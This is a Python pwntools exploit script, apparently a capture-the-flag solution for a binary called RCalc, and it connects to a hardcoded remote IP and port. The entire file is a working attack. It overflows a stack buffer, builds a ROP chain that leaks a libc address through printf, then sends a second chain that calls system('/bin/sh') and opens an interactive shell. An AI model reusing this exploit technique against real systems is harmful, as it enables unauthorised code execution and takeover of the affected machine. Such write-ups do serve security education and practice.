#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'RCalc'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "124.126.19.106"
remotePort = 57257

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(num1, num2):
	sla('Your choice:', '1')
	sla('integer:', str(num1) + '\n' + str(num2))
	sla('result?', 'yes')
	
#--------------------------Exploit--------------------------
def exploit():
	pop_rdi = 0x401123
	pop_rsi_r15 = 0x0000000000401121
	start = 0x401036

	p = 'A' * 0x108
	p += p64(0x1) # random num
	p += p64(0xdeedbeef)
	p += p64(pop_rdi)
	leak = '__libc_start_main'
	p += p64(exe.got[leak]) # scanf cannot read \x20

	p += p64(pop_rsi_r15) + p64(0) + p64(0) # for printf cannot read mem
	p += p64(exe.plt['printf'])
	p += p64(start) # cannot read 0x9

	sla('pls:', p)

	for i in range(0x20):
		ad(1, 2)
	ad(2, 2)
	ad(0x331, 0)

	ad(0x1, 0)
	sla('Your choice:', '5')
	
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - lib.sym[leak]
	li('libc_base ' + hex(lib.address))

	p = 'A' * 0x108
	p += p64(0x1) # random num
	p += p64(0xdeedbeef)
	p += p64(pop_rdi)
	p += p64(lib.search('/bin/sh').next()) # scanf cannot read \x20
	p += p64(lib.sym['system'])
	sla('pls:', p)

	for i in range(0x20):
		ad(1, 2)
	ad(2, 2)
	ad(0x331, 0)

	ad(0x1, 0)
	#db()
	sla('Your choice:', '5')





def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
